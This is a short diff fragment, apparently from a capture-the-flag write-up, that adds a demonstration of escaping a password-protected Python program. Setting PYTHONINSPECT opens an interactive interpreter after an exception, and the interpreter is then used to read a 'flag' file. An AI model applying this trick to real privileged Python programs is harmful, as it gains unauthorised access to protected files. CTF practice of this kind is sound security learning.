@@ -20,3 +20,11 @@ try:
     
 
 Please enter password : ultrasecret()
+
+PYTHONINSPECT=YesMyLord ./xx
+Please enter password : Whatever !
+Traceback (most recent call last):
+<SNIP>
+>>> f = open("flag")
+>>> print f.readlines()
+['...']
